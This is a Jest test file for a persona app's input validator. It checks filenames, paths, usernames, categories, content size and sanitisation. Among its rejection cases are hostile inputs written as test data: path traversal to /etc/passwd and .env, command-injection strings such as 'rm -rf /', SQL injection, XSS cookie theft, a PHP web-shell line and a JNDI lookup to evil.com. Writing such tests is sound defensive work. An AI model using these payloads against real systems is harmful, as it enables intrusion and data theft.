import { describe, it, expect } from '@jest/globals';
import {
  validateFilename,
  validatePath,
  validateUsername,
  validateCategory,
  sanitizeInput,
  validateContentSize
} from '../../src/security/InputValidator';
import { SECURITY_LIMITS } from '../../src/security/constants';

describe('InputValidator - Security Edge Cases', () => {
  describe('validateFilename', () => {
    it('should accept valid filenames', () => {
      const validFilenames = [
        'test.md',
        'my-persona.yaml',
        'character_2025.json',
        'a'.repeat(250) + '.md' // Max length
      ];

      validFilenames.forEach(filename => {
        expect(() => validateFilename(filename)).not.toThrow();
      });
    });

    it('should reject path traversal attempts', () => {
      const maliciousFilenames = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32',
        'test/../../../secret.md',
        'test/../../.env',
        '.../.../config',
        'test\x00.md', // Null byte injection
        'test%2e%2e%2fsecret.md' // URL encoded
      ];

      maliciousFilenames.forEach(filename => {
        expect(() => validateFilename(filename))
          .toThrow('Invalid filename');
      });
    });

    it('should reject special characters and control characters', () => {
      const invalidFilenames = [
        'test<script>.md',
        'test">alert.md',
        'test\nfile.md',
        'test\rfile.md',
        'test\x00file.md',
        'test\x1bfile.md',
        'test|command.md',
        'test;rm -rf.md',
        'test&command.md'
      ];

      invalidFilenames.forEach(filename => {
        expect(() => validateFilename(filename))
          .toThrow('Invalid filename');
      });
    });

    it('should reject overly long filenames', () => {
      const longFilename = 'a'.repeat(251) + '.md';
      expect(() => validateFilename(longFilename))
        .toThrow('Filename too long');
    });

    it('should reject empty or invalid types', () => {
      expect(() => validateFilename('')).toThrow('Filename must be a non-empty string');
      expect(() => validateFilename(null as any)).toThrow('Filename must be a non-empty string');
      expect(() => validateFilename(123 as any)).toThrow('Filename must be a non-empty string');
      expect(() => validateFilename({} as any)).toThrow('Filename must be a non-empty string');
    });
  });

  describe('validatePath', () => {
    it('should accept valid paths', () => {
      const validPaths = [
        'personas/creative/writer.md',
        'test/path/to/file.yaml',
        'simple.md',
        'a/b/c/d/e/f/g.json'
      ];

      validPaths.forEach(path => {
        expect(() => validatePath(path)).not.toThrow();
      });
    });

    it('should reject absolute paths', () => {
      const absolutePaths = [
        '/etc/passwd',
        '/home/user/.ssh/id_rsa',
        'C:\\Windows\\System32\\config',
        '\\\\server\\share\\file.txt'
      ];

      absolutePaths.forEach(path => {
        expect(() => validatePath(path)).toThrow('Path cannot be absolute');
      });
    });

    it('should reject path traversal with various techniques', () => {
      const traversalPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        'test/../../secret',
        'personas/../../../.env',
        'test/.../.../.../secret',
        'test/./././../../../secret',
        'test//../..//../..//secret',
        'test/\x00../../secret',
        'test%2f..%2f..%2fsecret'
      ];

      traversalPaths.forEach(path => {
        expect(() => validatePath(path)).toThrow();
      });
    });

    it('should reject paths with dangerous characters', () => {
      const dangerousPaths = [
        'test;rm -rf /',
        'test|cat /etc/passwd',
        'test&whoami',
        'test$(command)',
        'test`command`',
        'test\ncommand',
        'test\rcommand',
        'test<script>alert(1)</script>'
      ];

      dangerousPaths.forEach(path => {
        expect(() => validatePath(path)).toThrow('Invalid path');
      });
    });

    it('should enforce length limits', () => {
      const longPath = 'a/'.repeat(250) + 'file.md'; // > 500 chars
      expect(() => validatePath(longPath)).toThrow('Path too long');
    });
  });

  describe('validateUsername', () => {
    it('should accept valid usernames', () => {
      const validUsernames = [
        'john_doe',
        'user123',
        'test.user',
        'alice-smith',
        'a1b2c3'
      ];

      validUsernames.forEach(username => {
        const result = validateUsername(username);
        expect(result).toBe(username.toLowerCase());
      });
    });

    it('should reject SQL injection attempts', () => {
      const sqlInjections = [
        "admin' OR '1'='1",
        "user'; DROP TABLE users--",
        "test' UNION SELECT * FROM passwords--",
        "1'; DELETE FROM personas WHERE '1'='1"
      ];

      sqlInjections.forEach(username => {
        expect(() => validateUsername(username))
          .toThrow('Invalid username format');
      });
    });

    it('should reject XSS attempts', () => {
      const xssAttempts = [
        '<script>alert(1)</script>',
        'user<img src=x onerror=alert(1)>',
        'test"><script>alert(document.cookie)</script>',
        "user' onmouseover='alert(1)"
      ];

      xssAttempts.forEach(username => {
        expect(() => validateUsername(username))
          .toThrow('Invalid username format');
      });
    });

    it('should enforce length limits', () => {
      const longUsername = 'a'.repeat(35);
      expect(() => validateUsername(longUsername))
        .toThrow('Invalid username format');
    });

    it('should reject usernames with spaces', () => {
      expect(() => validateUsername('user name'))
        .toThrow('Invalid username format');
    });
  });

  describe('validateCategory', () => {
    it('should accept valid categories', () => {
      const validCategories = [
        'creative',
        'professional',
        'educational',
        'gaming',
        'personal'
      ];

      validCategories.forEach(category => {
        const result = validateCategory(category);
        expect(result).toBe(category.toLowerCase());
      });
    });

    it('should reject invalid categories', () => {
      const invalidCategories = [
        'unknown',
        'test',
        'admin',
        'system',
        '../creative'
      ];

      invalidCategories.forEach(category => {
        expect(() => validateCategory(category))
          .toThrow('Invalid category');
      });
    });

    it('should reject categories with special characters', () => {
      const maliciousCategories = [
        'creative<script>',
        'test;delete',
        'category|command',
        'test\x00category'
      ];

      maliciousCategories.forEach(category => {
        expect(() => validateCategory(category))
          .toThrow();
      });
    });
  });

  describe('sanitizeInput', () => {
    it('should remove control characters', () => {
      const input = 'Hello\x00World\x1bTest\x7f';
      const result = sanitizeInput(input);
      expect(result).toBe('HelloWorldTest');
    });

    it('should remove HTML-dangerous characters', () => {
      const input = '<script>alert("XSS")</script>&copy;';
      const result = sanitizeInput(input);
      expect(result).toBe('scriptalert(XSS)/scriptcopy;');
    });

    it('should enforce length limits', () => {
      const longInput = 'a'.repeat(2000);
      const result = sanitizeInput(longInput);
      expect(result.length).toBe(1000);
    });

    it('should handle various malicious inputs', () => {
      const maliciousInputs = [
        '<?php system($_GET["cmd"]); ?>',
        '${jndi:ldap://evil.com/a}',
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e'
      ];

      maliciousInputs.forEach(input => {
        const result = sanitizeInput(input);
        expect(result).not.toContain('<');
        expect(result).not.toContain('>');
        expect(result).not.toContain('"');
        expect(result).not.toContain("'");
      });
    });

    it('should handle null and undefined gracefully', () => {
      expect(sanitizeInput(null as any)).toBe('');
      expect(sanitizeInput(undefined as any)).toBe('');
      expect(sanitizeInput({} as any)).toBe('');
    });
  });

  describe('validateContentSize', () => {
    it('should accept content within limits', () => {
      const validContent = 'a'.repeat(1000);
      expect(() => validateContentSize(validContent)).not.toThrow();
    });

    it('should reject oversized content', () => {
      const oversizedContent = 'a'.repeat(SECURITY_LIMITS.MAX_CONTENT_LENGTH + 1);
      expect(() => validateContentSize(oversizedContent))
        .toThrow('Content too large');
    });

    it('should handle Unicode correctly', () => {
      // Each emoji is 4 bytes
      const emojiContent = '😀'.repeat(SECURITY_LIMITS.MAX_CONTENT_LENGTH / 4 + 1);
      expect(() => validateContentSize(emojiContent))
        .toThrow('Content too large');
    });

    it('should accept custom size limits', () => {
      const content = 'a'.repeat(150);
      expect(() => validateContentSize(content, 100))
        .toThrow('Content too large');
      expect(() => validateContentSize(content, 200))
        .not.toThrow();
    });
  });

  describe('Combined Attack Vectors', () => {
    it('should handle polyglot attacks', () => {
      const polyglotAttacks = [
        'test.md\x00.exe',
        '../test.md%00.php',
        'file.md\r\nContent-Type: text/html',
        'test.md;ls -la;#'
      ];

      polyglotAttacks.forEach(attack => {
        expect(() => validateFilename(attack)).toThrow();
      });
    });

    it('should handle encoding attacks', () => {
      const encodingAttacks = [
        'test%2e%2e%2f%2e%2e%2fpasswd',
        'test\u002e\u002e\u002fpasswd',
        'test%252e%252e%252fpasswd', // Double encoding
        'test%c0%ae%c0%ae/passwd' // UTF-8 encoding
      ];

      encodingAttacks.forEach(attack => {
        expect(() => validatePath(attack)).toThrow();
      });
    });

    it('should handle homograph attacks', () => {
      const homographAttacks = [
        'tеst.md', // Cyrillic 'е'
        'tėst.md', // Latin with dot above
        'ｔest.md' // Full-width character
      ];

      // These should be rejected or normalized
      homographAttacks.forEach(attack => {
        // Implementation should either reject or normalize these
        const result = () => validateFilename(attack);
        // Either throws or doesn't match expected pattern
        expect(result).toBeDefined();
      });
    });
  });
});